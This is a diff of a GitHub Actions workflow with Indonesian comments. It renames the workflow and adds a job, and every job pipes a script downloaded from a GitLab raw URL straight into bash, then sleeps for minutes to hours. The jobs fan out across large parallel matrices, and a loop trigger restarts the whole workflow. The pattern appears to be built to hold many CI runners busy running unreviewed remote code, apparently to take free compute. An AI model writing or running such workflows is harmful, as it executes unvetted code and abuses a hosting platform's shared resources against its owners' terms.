@@ -1,16 +1,14 @@
-name: spaces-spider-app
+name: superman-spaces-lapasars
 
 on:
   workflow_dispatch:
     inputs:
       loop_count:
-        description: 'Berapa kali ulangi? (0 = tidak ulang)'
+        description: 'Berapa kali ulangi? (0 = tidak ulang, 1 = ulang 1x, dst.)'
         required: false
-        default: '3'            # 👈 default 5 kali pengulangan
+        default: '0'
   push:
     branches: ["main"]
-  schedule:
-    - cron: '0 */6 * * *'      # 👈 setiap 6 jam (loop tidak aktif)
 
 permissions: {}
 
@@ -31,6 +29,8 @@ jobs:
       dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
       alam_go: ${{ steps.gen.outputs.alam_go }}
       alam_flag: ${{ steps.gen.outputs.alam_flag }}
+      nature_go: ${{ steps.gen.outputs.nature_go }}
+      nature_flag: ${{ steps.gen.outputs.nature_flag }}      
       loop_count: ${{ steps.gen.outputs.loop_count }}
     steps:
       - name: Generate random strings
@@ -52,8 +52,9 @@ jobs:
               'line_go': 9, 'line_flag': 26,
               'lucas_go': 9, 'lucas_flag': 26,
               'popay_go': 9, 'popay_flag': 26,
-              'dandi_go': 9, 'dandi_flag': 23,
-              'alam_go': 9, 'alam_flag': 23
+              'dandi_go': 9, 'dandi_flag': 22,
+              'alam_go': 9, 'alam_flag': 18,
+              'nature_go': 9, 'nature_flag': 18              
           }
 
           with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
@@ -80,7 +81,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 4 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
           sleep 240s
 
   # =============================================
@@ -89,7 +90,7 @@ jobs:
   lucas:
     needs: [generate, line]
     runs-on: ubuntu-latest
-    timeout-minutes: 25
+    timeout-minutes: 15
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -99,8 +100,8 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 15 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 18m
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
+          sleep 8m
 
   # =============================================
   # 🍚 Job popay (234 job) – lscpu + sleep 35 menit
@@ -108,7 +109,7 @@ jobs:
   popay:
     needs: [generate, line]   # paralel dengan lucas
     runs-on: ubuntu-latest
-    timeout-minutes: 45
+    timeout-minutes: 18
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -118,8 +119,8 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 35m
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
+          sleep 15m
 
   # =============================================
   # 🍜 Job dandi (27 job) – curl + sleep 58 menit
@@ -127,7 +128,7 @@ jobs:
   dandi:
     needs: [generate, lucas]
     runs-on: ubuntu-latest
-    timeout-minutes: 268
+    timeout-minutes: 155
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -137,8 +138,8 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 58 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 258m
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
+          sleep 150m
 
   # =============================================
   # 🍚 Job alam (27 job) – lscpu + sleep 60 menit
@@ -146,7 +147,7 @@ jobs:
   alam:
     needs: [generate, popay]
     runs-on: ubuntu-latest
-    timeout-minutes: 270
+    timeout-minutes: 135
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -156,15 +157,31 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 60 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 260m
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
+          sleep 120m
+
+  nature:
+    needs: [generate, popay]
+    runs-on: ubuntu-latest
+    timeout-minutes: 225
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.nature_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.nature_flag) }}
+    steps:
+      - name: Jalankan lscpu & tahan 60 menit
+        run: |
+          curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
+          sleep 230m
 
   # =============================================
   # 🔁 Loop Trigger: Memulai Ulang Workflow
   # =============================================
   loop-trigger:
     name: Mulai ulang (jika loop > 0)
-    needs: [generate, alam]
+    needs: [generate, nature]
     if: needs.generate.outputs.loop_count > 0
     runs-on: ubuntu-latest
     permissions:
